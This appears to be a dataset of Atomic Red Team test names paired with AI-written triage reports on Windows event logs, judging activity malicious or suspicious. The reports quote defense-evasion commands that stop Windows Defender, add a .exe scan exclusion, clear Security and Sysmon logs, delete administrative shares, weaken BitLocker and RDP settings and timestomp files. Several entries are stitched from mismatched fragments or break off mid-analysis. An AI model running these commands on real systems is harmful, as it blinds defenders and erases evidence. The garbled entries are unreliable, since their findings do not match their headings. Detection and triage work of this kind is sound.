3. **Log Clear Events:** In the System log (EventID 104), there are multiple entries indicating log files for various channels (System, Windows PowerShell) were cleared by the user ""admin_test"". The clearing of event logs is a significant red flag, indicating efforts to remove evidence of activity on the system.

4. **Security Log Cleared Event:** In the Security log (EventID 1102), there is a log entry showing the Security log itself was cleared. This is a direct indication of someone trying to remove traces of their activity.

5. **Common Windows Commands (e.g., `whoami.exe`, `hostname.exe`):** These commands were executed and are benign by themselves but can be components of scripts for reconnaissance or lateral movement strategies.

### Assessment:
The presence of frequent and concurrent execution of `wevtutil.exe` to clear distinct logs paired with PowerShell activity indicates potential malicious behavior. The activity aligns with techniques used to obfuscate or erase forensic traces and could point to an attacker attempting to cover their tracks after compromising the system.

### Guidance:
- **Resolution:** **MALICIOUS**
- **Recommendation:** It's advisable to start an in-depth investigation immediately. Check who has used the ""admin_test"" account and whether it was authorized. Examine network traffic during these events' times to determine any external communications or data exfiltration associated with the PowerShell command. Restore log data, if possible, using backups or other systems that may have collected logs concurrently. Bolster security configurations to prevent unauthorized log clearing and unauthorized PowerShell script executions in the future.
- **Action:** Initiate an incident response to contain, monitor, and mitigate any ongoing threats. Consider implementing tighter access controls and monitoring solutions for such privileged operations in the future to quickly identify and respond to similar incidents."
Rundll32 setupapi.dll Execution,"Upon analyzing the provided logs, the following observations were made:

1. **Command Line Activity**:

- **Review Credentials and Permissions**: Verify the `admin_test` account for unauthorized creation or use and review permissions and access logs for any anomalies.
- **Restore and Monitor Log Systems**: Implement tighter controls and monitoring on event log clearing to detect any future attempts, and consider using a centralized logging solution where logs cannot be easily deleted by local administrators.
- **Security Patch and Audit**: Ensure all systems are patched and perform a security audit to identify and mitigate vulnerabilities."
Event Viewer Registry Modification - Redirection URL,"Based on the provided logs, let's analyze the sequence of events to identify any suspicious or potentially malicious activities.

1. **Event Log Clearing Activity**:
    - The logs from the Security and System channels show Event ID 1102 and 104, respectively, indicating that the event logs have been cleared. This activity is performed by a user named ""admin_test"" on the machine SERVER002.
    - Clearing of logs is a behavior often associated with malicious activity as attackers frequently clear logs to hide their tracks.

2. **Wevtutil Execution**:
    - Sysmon logs capture multiple executions of ""wevtutil.exe"" to clear various logs including System, Security, and Windows PowerShell. This utility is legitimately used in Windows but can be misused to delete specific event logs.
    - The commands executed (e.g., `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`) indicate an attempt to clear logs, supporting the suspicion of potential malicious activity.

3. **Unauthorized Registry Modification**:
    - The PowerShell logs include an event where ""cmd.exe"" executes a registry modification command:
       - It modifies the key ""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer"" to redirect the MicrosoftRedirectionURL to ""file://C:\\windows\\system32\\notepad.exe"".
    - This behavior is not typical for routine operations and could indicate an attempt to alter system behavior or cover tracks.

4. **Regular System Processes**:
    - The remaining Sysmon entries show execution of various system processes and updates, particularly related to Microsoft Edge. These appear to be part of typical system maintenance operations like updates.

**Assessment and Conclusion**:

Activate Windows NoFileMenu Group Policy Feature,"Upon reviewing the provided Windows event logs, several indicators of potential malicious activity arise. Here is a detailed analysis:

### Summary of Suspicious Activities:

1. **Log Clearing via `wevtutil`:**
   - Event ID 104 in the System log and Event ID 1102 in the Security log indicate that logs were cleared. The tool `wevtutil.exe` is used to clear event logs and this action was performed by the user `admin_test`. This may be an attempt to erase traces of activity.

2. **Unauthorized Registry Change:**
   - Sysmon Event ID 1 shows the execution of `cmd.exe` to modify the registry, disabling the file menu (`NoFileMenu`) on Windows Explorer via `reg.exe`. This command was executed by `cmd.exe` and is typically indicative of malware trying to limit user capabilities.

3. **Potential Time Manipulation:**
   - Event ID 4616 in the Security log shows a suspicious time change performed by the `svchost.exe` process, which might indicate an attempt to manipulate timestamps.

4. **Excessive Privileges:**
   - Event ID 4672 indicates that `admin_test` was granted several high-level privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which could be abused for malicious purposes.

### Assessment:

- **Log Clearing Events**: The `wevtutil.exe` logs and event clearing entries are indicative of someone attempting to hide their tracks after potentially performing malicious activities. Clearing logs is a common tactic used by malware or attackers to obscure any evidence of their presence or actions.
  
- **Registry Modification**: The registry change executed via `cmd.exe` and `reg.exe` suggests that there might be an attempt to apply unauthorized changes to the system settings, often a characteristic behavior of malware.

- **Time Manipulation**: Alteration of system time without legitimate reason can be suspect, especially when performed alongside other suspicious activities.

### Conclusion and Guidance:

- **Resolution**: **MALICIOUS**

- **Guidance**:
  1. **Immediate Isolation**: Isolate `Server002` from the network to prevent any potential further compromise or lateral movement.
  2. **In-depth Investigation**: Execute thorough forensics on `Server002` to uncover the extent of the compromise, including any additional malware presence or configuration changes.
  3. **Review Admin Activity**: Investigate any recent activities performed by `admin_test` to determine whether those activities were authorized or compromised.
  4. **Audit and Remediation**: Perform a full security audit of privileged accounts and critical systems, and address any vulnerabilities or weak configurations. Revise and enforce stricter access controls and logging measures.
  5. **System Restore and Hardening**: Consider restoring affected systems to a known secure state and apply additional security hardening measures.
  6. **User Awareness and Training**: Educate users on recognizing and reporting suspicious activities to reduce the likelihood of accidental enabling of such operations in the future.

These steps should be executed promptly to ensure the security of your network and data integrity."
Modify EnableNonTPM Registry entry,"Upon analyzing the logs provided, I have identified several suspicious activities that warrant further investigation:

1. **Use of wevtutil.exe to Clear Logs**: 
    - Multiple instances of `wevtutil.exe` were observed using command lines to clear various event logs such as Sysmon, Application, System, Security, and Windows PowerShell. This behavior is indicative of an attempt to cover tracks post-compromise, as log clearing is not a usual action for administrative tasks.
    - Sysmon Event IDs 1 and 5 demonstrate the execution and signing off for processes that align with these actions, all executed by user `admin_test`.

2. **Registry Modification**:
    - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f` was executed. This command modifies the registry to disable TPM (Trusted Platform Module) protection for BitLocker, which could be a potential step to bypass security restrictions.

3. **Logs and Account Activity**:
    - The security log shows Event ID 1102, which indicates that the security log was cleared, another classic sign of malicious intent.
    - System Event ID 104 appears in multiple logs for various channels, confirming that logs were cleared.

4. **Use of High Privilege Commands**:
    - The presence of commands like `whoami.exe` and `hostname.exe` can be used to gain environment insights, but their occurrence amid suspicious log-clearing commands raises red flags.

Given these observations, I analyze the scenario as follows:

- **Resolution**: **MALICIOUS**

The combination of clearing system, security, and application logs through `wevtutil.exe`, combined with registry modifications and the execution of commands to disable security measures, strongly suggests malicious activity designed to hide traces of unauthorized actions and modify security settings. Immediate actions should be taken to audit user `admin_test` and assess the potential breach vector. Additionally, consider reinstating a backup of the logs if available, strengthening security policies, and monitoring for further anomalies."
Tamper with Windows Defender Command Prompt,"After carefully examining the provided Windows event logs, I have identified several instances that indicate suspicious behavior and potential malicious activity:

### Indicators of Suspicious Activity:
1. **Log Clearing Events**: 
   - Several logs in the Security and System channels have been cleared by the user `admin_test`. For instance, EventID 1102 (Security log cleared) and EventID 104 (System log cleared) are observed, which indicate an attempt to cover tracks, a common practice in malicious activities.

2. **Command-Line Execution with `cmd.exe`**:
   - The execution of `cmd.exe` with the command `sc stop WinDefend & sc config WinDefend start=disabled & sc query WinDefend` is suspicious. This command disables Windows Defender, which could indicate an attempt by malware to disable security defenses and operate without detection.

3. **Frequent Use of `wevtutil.exe`**:
   - Multiple executions of `wevtutil.exe` with the `cl` (clear log) argument indicates logs were deliberately being cleared, matching the log-clearing events.

4. **High Integrity Processes**:
   - The processes run by the user `admin_test` have a high integrity level, indicating they have administrative-level privileges. This heightens the risk if these processes are indeed malicious.

5. **Timing and Sequence of Events**:
   - The sequence of actions reflects typical steps taken in an attack: disabling security features, clearing logs to remove traces, and then executing other potentially malicious software.

### Conclusion:
Based on the multiple instances of log clearing, disabling of Windows Defender, and the subsequent suspicious command executions, there is a high likelihood that these activities are malicious.

### Resolution:
- **MALICIOUS**: The logs contain activity that is consistent with known malicious behavior, such as disabling security features and erasing potential evidence through log clearance.

### Guidance on How to Proceed:
- **Immediate Action**: Isolate the impacted system, `Server002`, from the network to prevent further compromise.
- **Further Investigation**: Conduct a thorough forensic investigation to understand the extent of the compromise and identify any affected systems or data. This includes reviewing other systems' logs, scanning for malicious software, and identifying the source of compromise.
- **Remediation Steps**: Restore affected systems to a known good state and implement enhanced monitoring to detect similar activities in the future.

This assessment concludes the logs indicate malicious activity, warranting immediate attention and comprehensive action."
Allow RDP Remote Assistance Feature,"Upon examining the provided Windows event logs, I have identified several indicators of potentially suspicious and possibly malicious activity:

1. **Log Clearing Events (System Log):**
   - Multiple instances of log clearing were recorded (`EventID: 104` in the System log and `EventID: 1102` in the Security log), conducted by the user `admin_test`. The logs include the System, Windows PowerShell, and Security channels.
   - These actions were carried out by the command line utility `wevtutil.exe`, which is typically used to manage and clear event logs. The rapid succession of these events, combined with the absence of a legitimate reason, suggests an attempt to hide other activities.

2. **Command Execution (Sysmon Log):**
   - There are several command-line activities executed by `wevtutil.exe`, including clearing event logs (`cl`) for multiple channels (System, Application, Security, Windows PowerShell) rapidly one after another. This is unusual, especially under a high-integrity context by the user `admin_test`.
   - A suspicious `cmd.exe` command execution (`ProcessId: 1100`) attempts to modify the registry (`reg add`) to adjust Terminal Server settings, suggesting potential malware involvement or unauthorized configuration changes to enable or facilitate remote access.
   
3. **Time Manipulation (Kernel General and Security Logs):**
   - Time manipulation events with `EventID: 4616` and changes in system time are noted (`NewTime` and `OldTime` fields). Such actions might be designed to mislead chronologically-dependent log entries or to interfere in operational oversight.

4. **Observation of Standard Utilities:**
   - Execution of standard utilities like `whoami.exe` and `Hostname.exe` under the same `admin_test` context could be part of reconnaissance efforts to gather information about the system and its environment.

### Assessment:

Based on the analysis, the activities noted are highly anomalous and align with known methods of covering tracks after potential malicious operations:

- Execution of `wevtutil.exe` to clear logs by an administrator account without legitimate justification.
- Registry manipulation to alter Terminal Services settings, which could potentially facilitate unauthorized remote access.
- Time alteration events which could undermine log integrity and coherence.

### Recommendation:

Given these observations, the situation is classified as **MALICIOUS**, with a strong likelihood of compromise. Immediate actions should be taken to mitigate further risks:

- **Investigate the User Account:** Review and temporarily suspend the `admin_test` account and any processes associated with it.
- **Restore and Secure Logs:** Ensure that all logs are being properly recorded and review backup logs prior to the clearing events for more insights.
- **Analyze Network Traffic:** Look for any anomaly related to remote access or data exfiltration attempts.
- **Conduct a Full Security Audit:** Consider a more thorough forensic investigation and possibly disconnecting the affected host from the network for detailed analysis.

Prompt response is critical to contain the threat and minimize potential harm to the system and wider network."
Remove Network Share,"The analysis of the given event logs reveals several activities that warrant further attention:

### Suspicious and Anomalous Behaviors:

1. **Event Log Clearing:**
   - EventID 1102 from the security log indicates that the Security Log was cleared by the user `admin_test`. Clearing of security logs is highly suspicious as it may indicate a malicious attempt to cover tracks after an unauthorized activity.
   - Corresponding Sysmon logs (wevtutil.exe) with command lines indicating security, system, application, and Windows PowerShell logs were cleared by the same user indicate systematic log clearing, which is typically associated with activities meant to hide malicious actions.

2. **Command Line Usage and Process Execution:**
   - Execution of `wevtutil.exe` for clearing logs (`""C:\\Windows\\system32\\wevtutil.exe"" cl Security`, `""C:\\Windows\\system32\\wevtutil.exe"" cl System`, etc.) suggests deliberate actions to purge event logs.
   - Execution of processes like `cmd.exe` for network share deletion (`CommandLine : ""cmd.exe"" /c net share \\test\share /delete`) under the `admin_test` user from an `AppData\Local\Temp` directory raises a red flag due to the change potentially affecting shared resources without clear business needs or authorization.
   - Frequent execution of legitimate tools such as `hostname.exe`, `whoami.exe` are typical reconnaissance commands, which when combined with other suspicious activity, can form part of a larger malicious pattern.

3. **Time and System Manipulations:**
   - Event IDs (4616, 4616 in Syslog) indicating changes in system time suggest potential attempts to manipulate time-based logs or security measures, another tactic often used to obfuscate audit trails.

### Indicators of Potential Malicious Activity or Compromise:

- The concerted clearing of logs (security, system, application, and PowerShell) by `admin_test` typically indicates malicious intent. Malicious operators often clear logs to avoid detection.
- Scripting and command-line execution for deletion of network shares in a directory commonly used for temporary data caching can imply unauthorized or unintended manipulation, which could be malicious if not backed by an established change management or IT task.

### Assessment and Threats:

The logs exhibit several indicators of potential compromise, stemming from the systematic clearing of logs which is typically an attempt to cover illicit operations. The activity seen with system commands and process executions should not occur unless within a controlled and authorized activity, which should reflect pre-approved IT maintenance or script operations.

### Guidance and Resolution:

1. **Resolution**: **MALICIOUS**

2. **Immediate Actions:**
   - Conduct a thorough investigation into `admin_test` account use: Review user activity, access patterns, and most importantly verify if this action was authorized.
   - Isolate the affected systems (Server002) from the rest of the network to prevent potential lateral movement by any unauthorized actors.
   - Retrieve and preserve any relevant artifacts or logs remnants that might be analyzed further.

3. **Further Steps:**
   - Implement stricter controls and monitoring, especially on administrative tasks and account activities.
   - Review and strengthen incident response plans and logging integrity checks.
   - Engage in forensic analysis to understand the full scope and origination of the suspicious activities, potentially discovering other compromised systems.

In conclusion, the logs strongly suggest that there has been a potential breach or abuse of privileges by an insider threat or via credential compromise, warranting immediate controlled containment and investigation procedures."

5. **Enhanced Monitoring**: Enable additional monitoring for unusual processes and command execution across the network, using tools capable of detecting PowerShell misuse and log tampering.

Reevaluate security controls and protocols to safeguard against the identified tactics and procedures exhibited in these logs, and conduct a full forensic analysis to ensure complete remediation."
Disable Administrative Share Creation at Startup,"After analyzing the provided Windows event logs, here are the findings:

### General Observations:
1. **Multiple Log Cleared Events**:
   - Several logs including the System, Security, and Windows PowerShell logs have been cleared by the user `admin_test`. This typically indicates an attempt to hide tracks, especially if performed by an unauthorized user.

2. **Anomalous Command Execution**:
   - We observed `cmd.exe` executing commands that modify registry settings related to `LanmanServer` parameters (`AutoShareServer` and `AutoShareWks`). This could indicate an attempt to disable administrative shares, which is commonly used to reduce visibility of the host and can be associated with malicious intent.

3. **High-Privilege Logon**:
   - The `admin_test` account appears to have performed multiple logons with elevated privileges, specifically involving high-level privileges typically reserved for system operators and administrators (e.g. `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`).

4. **Process Creation Events**:
   - Utilities like `whoami.exe` and `hostname.exe` have been used, which, while common, can be used in enumeration tactics as part of a broader malicious operation.
   - The use of `wevtutil.exe` to clear event logs is particularly concerning due to its ability to obliterate the traces of previously logged activities.

5. **EdgeUpdate Activities**:
   - There are frequent updates associated with Microsoft Edge, which are handled by MicrosoftEdgeUpdate processes. This behavior, while noisy, can be associated with normal operations unless there's evidence of tampering or unusual modifications.

### Indicators of Compromise:
- **Log Clearing**: The deliberate clearing of system logs is a frequent indicator of malicious behavior trying to evade detection.
- **Registry Key Modifications**: Changing security and sharing settings can facilitate unauthorized access or lateral movement within a network.
- **Privilege Escalation Attempt**: Elevated privileges used in conjunction with other activities hint at possible elevation of privilege attempts.

### Conclusion:
Considering the combination of log clearing, registry modifications, and suspicious privileged activities, these logs suggest potential malicious activity or at the very least warrant a closer investigation.

### Resolution:
**SUSPICIOUS**

### Recommendations:
1. **Investigate Immediately**:
   - Conduct a thorough investigation of the account `admin_test`, including verification of legitimacy, and assess whether it has been compromised.

2. **Implement Monitoring**:
   - Enhance monitoring for any similar future activities, especially around critical services and high-privilege accounts.
   
3. **Audit Log Management**:
   - Secure logging to ensure audit trails cannot be altered without detection, possibly leveraging centralized log management.
   
4. **Review and Remediate Registry Changes**:
   - Review recent registry changes and validate with IT policies to ensure no unauthorized adjustments have been made that could impact security posture.
   
These steps should help clarify the situation and prevent any potential threats from materializing further within the network."
Windows - Timestomp a File,"Upon analyzing the provided collection of Windows event logs, the following observations and assessments have been made:

1. **Log Cleared Events:**
   - Several logs show Event ID 104 and 1102, indicating the clearing of various event logs such as System, Security, and Windows PowerShell logs by `admin_test`. 
   - Use of `wevtutil` to clear logs (`CommandLine`: `""C:\\Windows\\system32\\wevtutil.exe"" cl <LogName>`) is recorded in the Sysmon logs.

2. **Suspicious Command Execution:**
   - PowerShell event logs (Event ID 600) indicate the execution of scripts including `timestomp.ps1`. This is a notable tool often used within attack frameworks to alter file timestamps for stealth purposes. 
   - The PowerShell command line indicates the import and execution of this script: `powershell.exe & {import-module ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\timestomp.ps1"" timestomp -dest ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\kxwn.lock""}`.

3. **Sysmon Logs:**
   - Several executions of `wevtutil.exe` are indicative of log manipulation or clearing activity.
   - The presence of `timestomp.ps1` being executed using PowerShell further supports malicious intent.

4. **Edge Update Logs:**
   - Logs related to Microsoft Edge Update do not appear suspicious or directly related to malicious activities. They align with expected software update operations.

5. **Process Execution and Integrity:**
   - Notable processes such as `hostname.exe` and `whoami.exe` execution do not directly raise concerns but are often used in enumeration activities by attackers.
   - All recorded activities show executions at a high integrity level, typical of administrative access or privilege escalation.

**Assessment:**
- The activities within the logs show significant evidence of potential compromise.
- The clearing of event logs and execution of tools like `timestomp` suggest attempts to obfuscate malicious actions.
- These combined indicators point strongly towards a breach where efforts are made to hide the tracks of potentially malign operations.

**Resolution: MALICIOUS**
- The logs contain evidence of intentional log clearing, execution of timestomping scripts, and usage of PowerShell with malicious intent, which aligns with malicious activity.

**Guidance on How to Proceed:**
1. **Immediate Network Isolation:** Isolate the affected system (Server002) from the network to prevent further malicious activities or lateral movement.
2. **Forensic Investigation:** Conduct a thorough forensic analysis of the system to identify the full extent of the breach, including file modifications and potential data exfiltration.
3. **Review Access and Privileges:** Investigate and possibly reset credentials for `admin_test` and review any other privileged accounts for compromise.
4. **Update Security Measures:** Ensure all systems are hardened and updated, with enhanced monitoring to detect similar threats in the future.
5. **User Awareness:** Provide additional training and updates on recognizing and responding to signs of potential security events or breaches."
Invoke CHM Shortcut Command with ITS and Help Topic,"Upon analyzing the provided logs, several points stand out that suggest suspicious activities:

1. **Event Log Clearing:** The security log (EventID 1102) and system log (EventID 104) include events where logs were cleared. The ""admin_test"" user on ""SERVER002"" cleared both the Security and System event logs. Log clearing, especially in security-sensitive logs, is a common practice by attackers to hide their tracks.

2. **Suspicious Powershell Activity:** In the Sysmon log, there is an event where PowerShell is invoked with a suspicious command:
   ```
   ""CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""
   ```
   This indicates the use of PowerShell to execute a command that clears the Microsoft-Windows-Sysmon log. This action, combined with the clearing of other logs, is highly indicative of an attempt to cover up activities on the system.

3. **Unusual Command Execution:** The command used in PowerShell:
   ```
   ""CommandLine"":""powershell.exe & {Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}""
   ```
   This command looks suspicious as it uses PowerShell to launch what seems to be a compiled help file. Such techniques are often used in attacks to execute malicious payloads hidden within compiled help files.

4. **High Integrity Level Processes:** Many of the analyzed processes, especially those involving PowerShell and wevtutil.exe, are running with a high integrity level. This suggests elevated privileges which might not be typical for a non-administrative process in a secure environment.

Based on the activities observed, especially the clearing of event logs and the execution of potentially malicious PowerShell commands, these logs indicate actions consistent with malicious activities aimed at system compromise and data concealment.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- Conduct a full forensic analysis on the affected system (SERVER002) to uncover any additional compromises or tools placed by the attackers.
- Investigate any other systems and networks that could have been accessed or compromised by the same threat actor.
- Ensure event logs across the network are being securely collected and stored in a centralized logging system that cannot be easily altered or deleted.
- Implement stricter PowerShell execution policies and regularly audit usage for any anomalous activity.
- Review and potentially reset credentials for any affected accounts, particularly ""admin_test"", to safeguard against further unauthorized access."
Uninstall Sysmon,"Upon reviewing the provided Windows event logs, I've identified several key points for evaluation regarding suspicious or potentially malicious activity:

### Security Log
- **Event ID 1102**: This event indicates that the audit log was cleared. It was cleared by a user named ""admin_test,"" whose security identifier (SID) is S-1-5-21-3962163828-2803415714-1403596700-1006. Clearing security logs can be indicative of an attempt to cover up tracks following unauthorized or malicious activity, as it removes records of past events that could be analyzed.

### Application Log
- The Application log events do not display overt signs of suspicious activity. 
- The events related to the ""edgeupdate"" service simply indicate that the service stopped at specific times, which can occur during regular system operations or updates. Without additional context, this does not, on its face, signify malicious behavior.
- The ""Software Protection Platform Service"" entry (Event ID 16384) also reflects typical service operation related to licensing and activation. 

### System Log
- **Event ID 104**: This also reflects the clearing of event logs, in this case, it's specifically stated for the System channel and the Windows PowerShell channel, again by ""admin_test"". Repeated instances of log-clearing increase the level of suspicion and suggest potential malicious activity or attempts to cover up administrative actions.
- The event associated with ""Microsoft-Windows-FilterManager"" (Event ID 1) does not show suspicious behavior directly; it shows activity related to the ""SysmonDrv"" driver. While Sysmon is a legitimate monitoring tool, seeing events related to driver management in close proximity to log clears can be of interest, but it does not alone indicate malicious activities.

### Assessment
The repeated clearing of logs by the same user, especially security and system logs, stands out as suspicious behavior. While not definitive proof of malicious activity by itself, it warrants further investigation due to the potential intention of obscuring other activities on this host. There might be legitimate administrative reasons for log clearing, but typically, routine log maintenance does not involve clearing security audit logs entirely.

### Conclusion and Recommendations
**Resolution: SUSPICIOUS**

This activity should certainly be categorized as ""SUSPICIOUS"" and merits a deeper investigation:
1. Identify the account owner of ""admin_test"" and verify whether the account's actions align with standard user activity or if it has been compromised.
2. Review any network activities and system changes around the timestamp of these events for any unauthorized access or data exfiltration.
3. Ensure robust logging practices, consider implementing a centralized logging system to prevent log tampering on individual hosts.
4. Conduct a full security audit on ""Server002"" to check for any unauthorized modifications or active threats.

Ultimately, validating the context in which these event clears happened will provide more insight into the nature of these actions."
Tamper with Windows Defender ATP PowerShell,"**Detailed Analysis:**

Upon analyzing the provided event logs from multiple channels (Windows PowerShell, Application, Sysmon, Security, and System), several issues arise that could indicate potential malicious activity or a compromise, specifically related to the execution of commands that disable security features and log deletions.

### Findings:

1. **Powershell Commands Disabling Security:**
   - The Windows PowerShell log entries indicate that `powershell.exe` was used to execute a series of `Set-MpPreference` commands. These commands are used to disable several Windows Defender features, including real-time monitoring, behavior monitoring, script scanning, and blocking at first sight. Disabling these features can be indicative of attempts to evade detection and potentially malicious behavior.

2. **Security Posture Altered:**
   - The Application logs show several entries where Windows Defender's state is switched to ""SECURITY_PRODUCT_STATE_SNOOZED,"" which aligns with the PowerShell commands in the Windows PowerShell logs. This confirms that security measures were intentionally disabled.

3. **Log Files Cleared:**
   - The Security and System logs both have events that show the clearing of event logs (Event ID 1102 for the Security log and Event ID 104 for the System log). This activity, conducted under the user ""admin_test,"" is often associated with malicious actors attempting to cover their tracks.

4. **Scheduled Time Change:**
   - The Security and System logs indicate a forward and then backward adjustment of system time. This is unusual behavior that can be used to manipulate the logging timestamp, potentially obfuscating the time frame of an attack.

5. **Suspicious Command Execution with High Integrity Level:**
   - The Sysmon logs reveal commands executed with high integrity levels, including the cleared logs and potential administrative backdoor activity through `wsmprovhost.exe`. The sequence of `wevtutil.exe` commands further suggests attempts to manage event logs programmatically as a user with high integrity level rights.

### Assessment:

The logs indicate a pattern of suspicious and potentially malicious activity characterized by:
- Disabling of security features using PowerShell.
- Clearing of security and system logs.
- Unusual system time changes.
- Execution of commands and processes with high privileges associated with log management.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Measures:**
   - Isolate the host (Server002) from the network to prevent further malicious activity or data exfiltration.
   - Perform a full forensic investigation on Server002, focusing on the PowerShell history, system time adjustments, and log manipulations.

2. **Remediation Actions:**
   - Re-enable Windows Defender features and conduct a thorough malware scan.
   - Review and audit user account activity, specifically the user ""admin_test,"" for unauthorized use or privilege escalations.
   - Restore log files from backups, if available, to ensure a complete record is maintained.

3. **Preventive Actions:**
   - Implement stricter PowerShell logging and monitoring policies.
   - Review network security controls and implement application whitelisting where feasible.
   - Educate users on cybersecurity hygiene and increase the monitoring of high-risk behaviors."
Remove Administrative Shares,"Upon analyzing the provided Windows event logs, I have identified several key points of interest:

1. **Log File Clearance**: 
    - The `admin_test` user cleared multiple log files, including the System, Windows PowerShell, and Security logs at 2024-10-23, around 14:57 UTC. The events related to log file clearing are present in both the System and Security logs (Event ID 104 for System and Event ID 1102 for Security).
    - Frequent log clearing activity, especially by a non-standard administrative account (e.g., `admin_test`), is considered suspicious. This might be an attempt to cover tracks of potentially malicious activities.

2. **Command Execution and Unusual Commands**:
    - There is an execution of `cmd.exe` with a command to remove administrative shares (`net share C$ /delete`, `net share IPC$ /delete`, `net share ADMIN$ /delete`). The execution of these commands via command prompt by the `admin_test` user, especially when combined with log clearing, suggests abnormal and potentially disruptive behavior.
    - The use of both `net` and `net1` commands in quick succession indicates redundancy, which is peculiar.

3. **Process Execution**:
    - Several instances of process executions occur, such as various system utility tools (`wevtutil.exe`, `whoami.exe`, `hostname.exe`), under the account `admin_test` with high integrity level.
    - The repetitive spawning of console windows (e.g., `conhost.exe`) linked to these processes is generally consistent with command-line activity.
    
4. **Time Change Events**:
    - There are security events indicating that the system time was changed. While this might be legitimate administrative activity, when paired with log clearance and obscure commands, it could be an indication of an attempt to desynchronize logs for obfuscation.

5. **Account and Execution Context**:
    - The activities attributed to the `admin_test` user and executed from directories such as `C:\Users\admin_test\Documents\` suggest misuse of administrative privileges. Moreover, the user context (""SERVER002\\admin_test"") aligns consistently across suspicious sequences of operations.

Given the evidence of log file clearance, suspicious command execution intending to manipulate system configuration (removal of administrative shares), and the context of these activities (high integrity level, SYSTEM privilege), these logs represent behaviors commonly associated with malicious motives or actions attempting to evade detection.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately review and investigate the user `admin_test` to verify its legitimacy and check for any unauthorized use.
- Conduct a full review of user account permissions and recent changes.
- Ensure robust logging and monitoring are in place, and all critical logs are backed up and secured.
- Consider isolating the affected host and conducting a full forensic investigation to understand the extent of compromise and assess the presence of additional footholds or malware.
- Promptly review the network for further suspicious activities originating from or targeting `Server002`.

This analysis concludes that the log entries indicate actions consistent with attempts to evade detection and potential system misconfiguration or compromise."
RDP Authentication Level Override,"After a thorough review of the provided logs, let's outline the key findings and observations:

1. **Event Clearing**: Multiple instances of `wevtutil.exe cl` (to clear logs) are noted across several channels such as Sysmon, Application, System, and Security. Clearing logs on a system is an unusual activity that can indicate an attempt to hide tracks.

2. **Command Prompt and Registry Activity**: An entry involving `cmd.exe` with a command to modify the registry setting `AuthenticationLevelOverride` in the Terminal Server Client key is present. This can indicate malicious attempts to alter Remote Desktop Protocol (RDP) settings, often used to weaken security.

3. **Logon Activity and Privilege Use**: The account `admin_test` is shown to have SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, and others, suggesting high privilege use — combined with log clearing, this may suggest misuse or compromise of elevated privileges.

4. **Unusual Time Adjustments**: There are entries related to the modification of the system time, which is another tactic often used to disrupt log timestamps and potentially evade detection or timestamp checks in forensics.

5. **Benign Entries**: Most other entries related to Microsoft Edge Update, svchost.exe, and other background services appear to be normal system processes without indications of tampering or anomalies directly linked to malicious activity.

**Assessment**:
The logs contain multiple indicators of potentially malicious behavior, primarily centered around log manipulation (using `wevtutil.exe` to clear logs) and registry modification related to RDP settings. The execution of these tasks under a high-privileged account (`admin_test`) further elevates the risk profile of these activities.

**Resolution**: **MALICIOUS**

**Guidance**:
- **Immediate Actions**: Isolate Server002 from the network to prevent further potential compromise.
- **Investigate the `admin_test` account**: Determine if it is legitimate and why it was used to carry out these actions. Reset passwords and consider disabling the account pending further review.
- **Audit Other Systems**: Check other systems in the environment for similar logs, particularly focusing on any use of `wevtutil.exe` or unexpected registry changes.
- **Forensic Analysis**: Conduct a full forensic analysis of Server002 to understand the scope and intent of the actions. Look for any signs of data exfiltration or lateral movement.

This malicious activity suggests a potential insider threat or a compromised account being used to cover tracks and manipulate system settings to facilitate unauthorized access, especially via RDP."
Tamper with Windows Defender Evade Scanning -Extension,"### Detailed Analysis:

1. **Log File Clearance Events:**
   - **System, Windows PowerShell, and Security logs were cleared (Event IDs 104 and 1102) by the user `admin_test`.** Clearing logs is a common tactic used by attackers to cover their tracks. While such activity might be legitimate under certain operational procedures, it generally warrants further investigation, especially if not scheduled or expected.

2. **Unusual PowerShell Commands:**
   - **PowerShell executed with command to add an exclusion for `.exe` files (PowerShell Event ID 600).** The command `$excludedExts= "".exe""; Add-MpPreference -ExclusionExtension $excludedExts` attempts to exclude `.exe` files from Windows Defender's scans. This is atypical behavior and can be used to obfuscate malicious executables from security scans.

3. **Use of `wevtutil.exe`:**
   - **`wevtutil.exe` was used multiple times to clear logs (`System`, `Security`, `Windows PowerShell`).** The use of `wevtutil.exe` to clear event logs not only matches with the `LogFileCleared` events but also reinforces the possibility of malicious intent to hide activities. This tool is not commonly used in regular administrative tasks unless specific scenarios warrant it.

4. **Process Execution Anomalies:**
   - Numerous processes related to wevtutil and conhost execution. This type of operational behavior aligning with log clearance further indicates the likelihood of defensive evasion activities.

5. **Microsoft Edge Update Process:**
   - There are frequent references to the `MicrosoftEdgeUpdate.exe`. This typically signifies routine update processes. However, examining the sequence can help ascertain if these activities are consistent with legitimate browser updates facilitated by Windows Update or IT operations.

### Assessment of Situation:
- The combination of log file clearance, unusual PowerShell script execution, and specific usage of `wevtutil.exe` to clear event logs indicates strong potential indicators of compromise.
- These activities deviate significantly from normal and expected administrative behavior, suggesting efforts to obfuscate malicious activities on the system.

### Threats or Risks Identified:
- Unrestricted `.exe` files may allow execution of potentially harmful programs.
- Cleared logs eliminating a critical audit trail necessary for forensic analysis.
- Abnormal behavior may allow ongoing intrusion activities or passive foothold on the system, risking data integrity and confidentiality.

### Guidance on How to Proceed:
1. **Immediate Review and Verification:**
   - Crosscheck with the operations and IT administration teams to confirm if there is any scheduled or recognized activity that justifies these log clearances.

2. **Enhanced Monitoring:**
   - Enable heightened monitoring of `PowerShell` and `wevtutil.exe` activities across the network.
